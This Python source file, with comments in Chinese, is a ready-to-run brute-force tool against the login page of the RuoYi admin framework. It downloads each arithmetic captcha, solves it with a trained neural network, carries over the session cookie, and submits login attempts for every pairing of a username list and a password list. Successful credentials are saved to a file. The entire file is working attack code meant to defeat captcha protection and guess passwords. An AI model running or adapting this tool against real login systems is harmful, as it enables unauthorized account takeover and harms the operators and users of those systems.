import argparse
import requests
from PIL import Image
import torch
from torchvision import transforms
import re
import common
from Net import Net
from one_hot import vec2Text

# 初始化网络模型
net = Net()

def predict(inputs):
    net.eval()
    device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')
    net.to(device)
    with torch.no_grad():
        outputs = net(inputs)
        outputs = outputs.view(-1, len(common.captcha_array))
    return vec2Text(outputs)

def clean_text(text):
    text = text.strip()  # 去除首尾空格
    text = text.replace('？', '?')  # 替换中文问号为英文问号
    return text

def evaluate_expression_from_model_output(model_output):
    model_output = clean_text(model_output)
    
    pattern = r'(\d+)\s*([+\-×*/÷])\s*(\d+)\s*=?'
    match = re.search(pattern, model_output)
    
    if match:
        num1, operator, num2 = match.groups()
        num1, num2 = int(num1), int(num2)
        
        if operator == '+':
            result = num1 + num2
        elif operator == '-':
            result = num1 - num2
        elif operator in ['×', '*']:
            result = num1 * num2
        elif operator in ['/', '÷']:
            result = num1 / num2
            result = int(result)  # 保留整数部分
        else:
            raise ValueError(f"不支持的运算符: {operator}")
        
        print(f"识别的表达式: {model_output}, 计算结果: {result}")
        return result
    else:
        raise ValueError("表达式格式不符合预期。")

def get_captcha_result(url, headers):
    filepath = 'code.jpg'
    res = requests.get(url, headers=headers)  # 传递请求头
    with open(filepath, "wb") as f:
        f.write(res.content)

    # 从响应头中提取 JSESSIONID
    set_cookie_header = res.headers.get('Set-Cookie')
    if set_cookie_header:
        jsessionid_match = re.search(r'JSESSIONID=([^;]+)', set_cookie_header)
        if jsessionid_match:
            jsessionid = jsessionid_match.group(1)
            print(f"提取到的 JSESSIONID: {jsessionid}")
            headers['Cookie'] = f'JSESSIONID={jsessionid}'

    img = Image.open(filepath)
    trans = transforms.Compose([
        transforms.Resize((60, 160)),
        transforms.ToTensor()
    ])
    img_tensor = trans(img)
    img_tensor = img_tensor.unsqueeze(0)  # 添加批次维度

    model_path = 'model.pth'
    net.eval()
    net.load_state_dict(torch.load(model_path, map_location=torch.device('cpu'))['model_state_dict'])

    output = net(img_tensor)
    output = output.view(-1, len(common.captcha_array))
    output_text = vec2Text(output)
    
    print(f"模型输出文本: {output_text}")
    
    try:
        result = evaluate_expression_from_model_output(output_text)
        return str(result), headers  # 返回验证码结果和更新后的 headers
    except ValueError as e:
        print(f"处理表达式时出错: {e}")
        return None, headers

def login(username, password, validate_code, headers, login_url):
    data = {
        "username": username,
        "password": password,
        "validateCode": validate_code,  # 验证码作为字符串传递
        "rememberMe": "false"
    }
    response = requests.post(login_url, data=data, headers=headers)
    return response.json()  # 将响应转换为 JSON 格式

def enumerate_credentials(user_file, password_file, login_url, captcha_url, output_file, max_retries=3):
    try:
        with open(output_file, 'a') as result_file:
            with open(user_file, 'r') as user_file, open(password_file, 'r') as password_file:
                users = user_file.readlines()
                passwords = password_file.readlines()
            
            for username in users:
                for password in passwords:
                    username = username.strip()
                    password = password.strip()
                    print("----------------------------------------------------------------------------------------------------")
                    print(f"尝试用户名: {username}, 密码: {password}")
                    
                    retries = 0
                    while retries < max_retries:
                        headers = {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Priority': 'u=0'
                        }
                        validate_code, updated_headers = get_captcha_result(captcha_url, headers=headers)
                        
                        if validate_code:
                            print(f"验证码结果: {validate_code}")
                            response = login(username, password, validate_code, updated_headers, login_url)
                            print(f"服务器响应: {response}")
                            if response.get('code') == 0:
                                print("成功登录！")
                                result_file.write(f"URL：{login_url} 成功登录 - 用户名: {username}, 密码: {password}\n")
                                result_file.flush()
                                break  # 成功登录，退出验证码重试循环
                            elif response.get('code') == 500 and response.get('msg') == "验证码错误":
                                print("验证码错误，重新获取验证码并重试...")
                                retries += 1  # 计数器增加，继续重试
                            else:
                                print("登录失败，但不是验证码错误，不再重试当前用户名和密码组合。")
                                break  # 其他错误，不再重试当前组合
                        else:
                            print(f"验证码识别失败，重试第 {retries + 1} 次。")
                            retries += 1

            print("所有尝试均完成。")
    finally:
        print(f"结果已保存到 {output_file}")
        print("----------------------------------------------------------------------------------------------------")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="若依（不分离版）验证码识别爆破工具")
    parser.add_argument('-u', '--url', type=str, required=True, help='登录接口URL')
    parser.add_argument('-c', '--captcha', type=str, required=True, help='验证码URL')
    parser.add_argument('-o', '--output', type=str, default='result.txt', help='结果输出文件路径，默认生成result.txt')
    parser.add_argument('-r', '--retries', type=int, default=3, help='每组用户名和密码的最大重试次数')
    args = parser.parse_args()
    
    enumerate_credentials('username.txt', 'password.txt', args.url, args.captcha, args.output, args.retries)
